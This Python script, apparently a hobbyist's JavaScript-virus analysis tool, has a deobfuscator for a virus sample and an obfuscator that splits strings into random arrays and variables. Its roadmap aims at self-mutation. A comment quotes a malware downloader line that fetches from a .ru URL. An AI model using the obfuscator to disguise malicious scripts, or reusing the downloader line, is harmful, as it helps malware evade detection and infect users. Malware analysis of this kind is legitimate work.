#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
	目前版本v0.6
	
	计划:
	v0.7 --随机好多废数据.
	v0.8 --用vb二次加密.
	v0.9 --自变形.
	v1.0 --发布.
'''
__author__ = 'ahoo'

import sys
import io
import os
import codecs
import re
import shutil
import random

PutPath = '24_analysis.txt'		 	#JsVirus文件(卡饭精睿包2016.12.16.24).
OutPath = '24_reverse.vir'	#提取到的文件.

myJslog = []
varStr = []
varStrRemoveRepeat = []
varStrRemoveRepeat.append('ahoo')

AuthorSign = True
sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding='utf-8') #改变标准输出的默认编码 


def ReadLogFile(InPath,ReadTye = 'r'):
	logall = []
	#print(InPath)
	if os.path.exists(InPath):
		f = codecs.open(InPath,ReadTye,'utf-8')
		#读入到list
		for line in f:
			if None == line:
				pass
			else:
				logall.append(line)
	
		f.close()
	return logall


def WriteResultFile(OutRePath,findRe= [],WriteTye = 'a+'):		#后面可能改成词典
	#if os.path.exists(InPath):
	#	pass
	#else:
	#要用全局变量把这里变成只写一次吗
	global AuthorSign
	f = codecs.open(OutRePath,WriteTye,'utf-8')
	if AuthorSign == True:
		f.write('\n*****************************************************\r\n')
		f.write('*		 		ahoo JsVirusAnalysis 					    ')
		f.write('\n***************************************************\r\n\n')
		AuthorSign = False
	for i in findRe:
		f.write(i + '\n')
	f.close()
	return True

#解析引擎
def JSVirus_Parse():
	argv = sys.argv
	argc = len(sys.argv)
	
	#0.输入输出参数时用
	if argc > 3:
		print('Too many argv')	#需要换成debugger
		return False
	
	
	#1.读取文件到LineList
	myJslog = ReadLogFile(PutPath)
	
	
	#2.找到定义变量的line,记录为字典：var xnisd = "open";
	#  找到真实意义的代码行为解析做准备.
	
	varLineDict 	= {}
	CodeLineList 	= []
	writeList 		= []
	
	# 进行区分是不是变量的.
	for line in myJslog:
		if 'var' in line and '= "' in line:			#var xnisd = "open";
			key = re.match('[var]{3}\s*([a-z0-9A-Z_]{1,})\s*=\s*(".{1,}"$)',line)
			if(key != None):
				#print(key.group(2)) #
				varLineDict[key.group(1)] = key.group(2)
		else:
			CodeLineList.append(line)
	
	#print(varLineDict)
	#print(CodeLineList)
	
	#3.Parse
	for line in CodeLineList:
		#3.1 替换数组结构: ['e', ebylx, 'u', 'f'][1] --->ebylx
		for Line12_split in  re.findall('(\[[^\[\]]+\]\[\d\])',line):		#参考下面过程.
			index = int(re.match('\[(.*)\]\[(.*)\]',Line12_split).group(2))
			repstr = re.match('\[(.*)\]\[(.*)\]',Line12_split).group(1).split(',')[index]
			replaceTemp = re.compile('(\[[^\[\]]+\]\[\d\])')
			line = replaceTemp.sub(repstr,line,count=1)
		#print(line)
		
		#3.2 替换变量为对应的值： ebylx --->"va"
		for varline in varLineDict:
			if varline in line:
				vartemp = re.compile(varline)
				line = vartemp.sub(varLineDict[varline],line)
		#print(line)
		
		#3.3 替换" + "为空格.
		plus = re.compile(r'"[\s\S]{0,3}\+[\s\S]{0,3}"')  
		line = plus.sub('',line)
		#print(line)
		
		writeList.append(line)
		
	#4 写入并打开文件
	WriteResultFile(OutPath,writeList)
	os.system('notepad.exe ' + OutPath)
	
	print('The Virus has been analyzed,there is my advice! Thanks!')
	return True

#分割引擎
def JSVirus_Split():
	argv = sys.argv
	argc = len(sys.argv)
	
	#1.读取文件到LineList
	myJslog = ReadLogFile(PutPath)
	
	'''
	#2.以一句话为例子.
	#效果：line11 = "fxejoplod6= woqvybd3[[yxypehn, 'gh', 'pk', 'o'][0] + ['rg', 'q', cjupryhfi][2]]([bnifpynmu, 'mj', 'e'][0], [ovfowqi, 'm', 'w'][0] , ['k', lwiju][1]);"
	
	#2.1先进行匹配要分割的代码放入到list中.
	line12 = '"GET","http://kamennyigorod.ru/form.uio",  "0"'
	line11 = 'fxejoplod6 = woqvybd3["open"]("GET","http://kamennyigorod.ru/form.uio",  "0");'
	print(re.findall('\[("[^\[\]\(\)]+")\]',line11)) #"open"
	print(re.findall('\(("[^\[\]\(\)]+")\)',line11)) #"GET", "http://kamennyigorod.ru/form.uio",  "0"
	
	#2.2构造替换字符串("open" 替换为数组字符串)
	openArry = replaceFindStrUsArrlist(line12)
	print(openArry)
	
	#2.3替换符合条件的----note:改变匹配规则为""之间的更实用.
	#patternFang = re.compile('\[("[^\[\]\(\)]+")\]')
	for i in re.findall('\[("[^\[\]\(\)]+")\]',line11):
		patternFang = re.compile(i)
		replaceTempstr = replaceFindStrUsArrlist(i)
		line11 = patternFang.sub(replaceTempstr,line11,count=1)
	print(line11)
	
	for j in re.findall('\(("[^\[\]\(\)]+")\)',line11):
		patternFang = re.compile(j)
		replaceTempstr = replaceFindStrUsArrlist(j)
		line11 = patternFang.sub(replaceTempstr,line11,count=1)
	print(line11)
	'''
	
	#2.1替换[] 和()之间的.
	writeList = []
	for line in myJslog:
		if line == "":
			#writeList.append(line)
			pass
		else:
			for i in re.findall('\[(\s*"[^\[\]\(\)]+"\s*)\]',line):
				patternFang = re.compile(i)
				replaceTempstr = replaceFindStrUsArrlist(i)
				line = patternFang.sub(replaceTempstr,line,count=1)
			
			for j in re.findall('\((\s*"[^\[\]\(\)]+"\s*)\)',line):
				patternFang = re.compile(j)
				replaceTempstr = replaceFindStrUsArrlist(j)
				line = patternFang.sub(replaceTempstr,line,count=1)
			writeList.append(line)	
			pass
			
	#2.2替换""之间的.	
	writeList2 = []
	for lin1 in myJslog:
		if lin1 == "":
			#writeList2.append(lin1)
			pass
		else:
			#print(lin1)
			for m in re.findall('"\s*[^"\,\+]+\s*"',lin1):
				if len(m) >= 2:
					patternYin = re.compile(m[1:-1])
					replaceTempstr1 = replaceFindStrUsArrlist(m[1:-1])
					#print(replaceTempstr1)
					lin1 = patternYin.sub(replaceTempstr1,lin1,count=1)
					#print(lin1)
				else:
					lin1 = m
			writeList2.append(lin1)
			pass
	#print(writeList2)
	
	
	#4 写入并打开文件
	#WriteResultFile(OutPath,writeList)
	
	
	#4.1字节写个乱序的function
	print(varStr)
	random.shuffle(varStr)
	print(varStr)
	WriteResultFile(OutPath,varStr)
	WriteResultFile(OutPath,writeList2)
	os.system('notepad.exe ' + OutPath)
	
	
	print('The Code has been Splited,there is my advice! Thanks!')
	return True	


#替换符合条件的查找到的为数组类型.------------?应该在这个地方生成var同时返回
def replaceFindStrUsArrlist(findstr):
	'''
	list_split_line = []
	list_split_line =  StrSplitLine(findstr)
	print(list_split_line)
	
	
	list_replace_usarry = []
	for i_list_split_line in list_split_line:
		strArry =  replaceListItemUsArrary(i_list_split_line)
		list_replace_usarry.append(strArry)
	print(list_replace_usarry)
	'''
	replacestr = ''
	#缺少个判断小于3个字符怎么办.
	if len(findstr) <=3:
		return findstr
	for i_list_split_line in StrSplitLine(findstr):
		replacestr = replacestr + replaceListItemUsArrary(i_list_split_line) + ' + '
	#print(replacestr[:-3])
	return replacestr[:-3]


#替换某一个元素为数组类型	
def replaceListItemUsArrary(listItem):
	
	#对分割后数组的某个元素进行替换:随机数组长度.(index = random -1)
	arrLengt= random.randint(3,5)
	index 	= random.randint(0,arrLengt-1)
	
	arrList =[]
	for i in range(0,arrLengt,1):
		#插入
		arrList.append(randStr(2,5))
		
	#v0.6
	varName = randStr(3,7)
	while varName in varStrRemoveRepeat:
		varName = randStr(4,8)
		
	varStrItem = 'var '+ varName + ' = "' + listItem + '"'
	#-------------------------------
	arrList[index] = varName
	replaceTemp = str(arrList) + '[' + str(index) + ']'
	
	replaceTemp_pattern = re.compile('\''+varName+'\'')
	replaceTemp = replaceTemp_pattern.sub(varName,replaceTemp)
	
	
	
	#print(arrList)
	#print(listItem)
	varStr.append(varStrItem)
	varStrRemoveRepeat.append(varName)
	print(varStrItem)
	print(replaceTemp)

	return replaceTemp


#随机一个长度2-5的字符串	
def randStr(min,max):
	
	randstr = ''
	strLengt = random.randint(min,max)
	for i in range(1,strLengt,1):
		chrTem = chr(random.randint(97,122))
		randstr = randstr + chrTem
	return randstr

#分割一个line中的元素返回list.
def StrSplitLine(strForSplit):
	result = []
	if len(strForSplit) == 0:
		#print(strForSplit)
		return result

	strleng = len(strForSplit)
	if strleng <= 4:
		result.append(strForSplit)
	else:
		randlen = random.randint(2,4)
		result.append(strForSplit[:randlen])
		tempList = StrSplitLine(strForSplit[randlen:])
		
		for j in tempList:
			result.append(j)
	return result
	

#分割一个list中的元素返回list.	
def StrSplit(strForSplit = []):
	strSplitList = []
	result = []
	if len(strForSplit) == 0:
		#print(strForSplit)
		return result

	for i in strForSplit:
		strleng = len(i)
		if strleng <= 4:
			result.append(i)
		else:
			#randlen = random.randint(2,int(strleng/2))
			randlen = random.randint(2,4)
			#print(randlen)
			#print(i[:randlen])
			#print(i[randlen:])
			strSplitList.append(i[:randlen])
			strSplitList.append(i[randlen:])
			#print(strSplitList)
			tempList = StrSplit(strSplitList)
			
			for j in tempList:
				result.append(j)
	#print('result\n')
	#print(result)
	return result



if __name__ == '__main__':
    JSVirus_Split()
